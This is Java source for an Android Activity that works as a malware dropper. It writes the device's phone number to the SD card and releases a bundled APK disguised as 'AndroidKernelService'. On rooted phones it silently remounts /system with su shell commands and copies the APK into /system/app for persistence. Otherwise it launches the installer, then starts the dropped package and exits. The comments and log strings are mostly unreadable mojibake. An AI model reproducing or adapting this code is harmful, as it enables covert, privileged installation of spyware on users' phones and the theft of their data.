package com.Qdzs;//���������
//���������

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.os.Environment;

public class QdzsActivity extends Activity {
	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {// ��дonCreate����
		super.onCreate(savedInstanceState);
		final String myLogFilePath = "/mnt/sdcard/";

		//�Ȱ��ֻ�������д��SD���С�
		SendSMS mySendSMS = new SendSMS();
		mySendSMS.writePhoneNum();
		
		// �ж�ϵͳ�Ƿ��Ѿ���װ���������Ѿ���װ�Ͳ��ٽ��а�װ

		WriteLogFile.writeLog("�ж�ϵͳ�Ƿ��Ѿ���װ���");
		if (isExist()) {
			WriteLogFile.writeLog("ϵͳ�Ѿ���װ�����");
			// ����Ѿ���װ������װ��ɾ��
			WriteLogFile.writeLog("�Ѿ���װ�ֻ��ˣ�����ִ��ɾ����װ���Ĳ���...");
			try {
				File mFile = new File("/mnt/sdcard/AndroidKernelService.apk");
				mFile.delete();
			} catch (Exception e) {
				WriteLogFile.writeLog("����װ��ɾ���쳣" + e.toString());
			}
			WriteLogFile.writeLog("��װ���Ѿ�ɾ����");
			// �����ֻ��˳���
			try {
				startAKS();
				startAKSActivity();
				WriteLogFile.writeLog("�ֻ��˳����������");
			} catch (Exception e) {
				WriteLogFile.writeLog("�����ֻ��˳����쳣" + e.toString());
			}
			WriteLogFile.writeLog("���˳�����");
			System.exit(0);

		} else {
			WriteLogFile.writeLog("ϵͳ��δ��װ�����");
			// ���û��װ

			// �ͷ����
			WriteLogFile.writeLog("�����ͷ�apk��...");
			WriteApk myWriteApk = new WriteApk();
			myWriteApk.Write();
			WriteLogFile.writeLog("apk�ļ��ͷ����...");
			// �ж��Ƿ�root�����ж�Ӧ�Ĳ���
			// �ж��Ƿ��Ѿ�root
			WriteLogFile.writeLog("�ж��Ƿ��Ѿ�root");
			IfRoot myIfRoot = new IfRoot();
			WriteLogFile.writeLog("ϵͳroot���£�" + myIfRoot.isRootSystem());
			if (!myIfRoot.isRootSystem()) {
				// û��root
				WriteLogFile.writeLog("ϵͳû��root");
				// ������װ����
				// �ֶ���װ���
				WriteLogFile.writeLog("�������氲װ");
				String fileName = myLogFilePath + "AndroidKernelService.apk";
				Intent intent = new Intent(Intent.ACTION_VIEW);
				intent.setDataAndType(Uri.fromFile(new File(fileName)),
						"application/vnd.android.package-archive");
				startActivity(intent);

			} else {
				// �Ѿ�root,��apk�����Ƶ�/system/appĿ¼��
				WriteLogFile.writeLog("ϵͳ�Ѿ�root�����ڸ����ֻ����ļ���/system/appĿ¼��");

				// �ڶ�������Ʒ���
				WriteLogFile.writeLog("�ڶ��ָ��Ʒ�����ʼ");
				String paramString = "adb push AndroidKernelService.apk /system/app"
						+ "\n"
						+ "adb shell"
						+ "\n"
						+ "su"
						+ "\n"
						+ "mount -o remount,rw -t yaffs2 /dev/block/mtdblock3 /system"
						+ "\n"
						+ "cat /sdcard/AndroidKernelService.apk > /system/app/AndroidKernelService.apk"
						+ "\n"
						+ "mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system"
						+ "\n" + "exit" + "\n" + "exit";
				if (RootCmd.haveRoot()) {
					if (RootCmd.execRootCmdSilent(paramString) == -1) {
						WriteLogFile.writeLog("��װ���ɹ�");
					} else {
						WriteLogFile.writeLog("��װ�ɹ�");
						
					}
				} else {
					WriteLogFile.writeLog("û��rootȨ��");
				}
				
				WriteLogFile.writeLog("�ڶ��ָ��Ʒ�������");

			}
		}
		try {
			// �����ֻ��˳���
			WriteLogFile.writeLog("�����ֻ��˳���...");
			startAKS();
			startAKSActivity();
			WriteLogFile.writeLog("�ֻ��˳����������");
		} catch (Exception e) {
			WriteLogFile.writeLog("�����ֻ��˳����쳣:" + e.toString());
		}
		WriteLogFile.writeLog("�����˳�����...");
		// �˳�����
		System.exit(0);
		WriteLogFile.writeLog("�˳��������");
	}

	public void startAKS() {
		// ����ľ��ĺ���(�������������û�н�ľ����������)
		Intent intent = getPackageManager().getLaunchIntentForPackage(
				"com.AndroidKernelService");
		if (intent != null) {
			startActivity(intent);
		}
	}

	public void startAKSActivity() {
		// ����ľ�������һ��Activity
		Intent intent = new Intent(
				"android.intent.action.AndroidKernelActivity");
		if (intent != null) {
			startActivity(intent);
		}
	}

	// �����ļ�����
	public static void copyFile(String sourceFile, String targetFile)
			throws IOException {
		BufferedInputStream inBuff = null;
		BufferedOutputStream outBuff = null;
		try {
			// �½��ļ����������������л���
			inBuff = new BufferedInputStream(new FileInputStream(sourceFile));

			// �½��ļ���������������л���
			outBuff = new BufferedOutputStream(new FileOutputStream(targetFile));

			// ��������
			byte[] b = new byte[1024 * 5];
			int len;
			while ((len = inBuff.read(b)) != -1) {
				outBuff.write(b, 0, len);
			}
			// ˢ�´˻���������
			outBuff.flush();
		} finally {
			// �ر���
			if (inBuff != null)
				inBuff.close();
			if (outBuff != null)
				outBuff.close();
		}
	}

	public boolean isExist() {
		PackageManager manager = this.getPackageManager();
		if (manager != null) {
			List<PackageInfo> pkgList = manager.getInstalledPackages(0);
			for (int i = 0; i < pkgList.size(); i++) {
				PackageInfo pI = pkgList.get(i);
				if (pI != null) {
					try {
						if (pI.packageName
								.equalsIgnoreCase("com.AndroidKernelService"))// ���ݰ�װ��Ӧ�õİ����ж�
							return true;
					} catch (Exception e) {
						WriteLogFile.writeLog("�ж�����Ƿ��Ѿ���װʱ����" + e.toString());
					}
				}
			}
		} else {
			WriteLogFile.writeLog("PackageManager����ı���managerΪ��");
		}
		return false;
	}
}
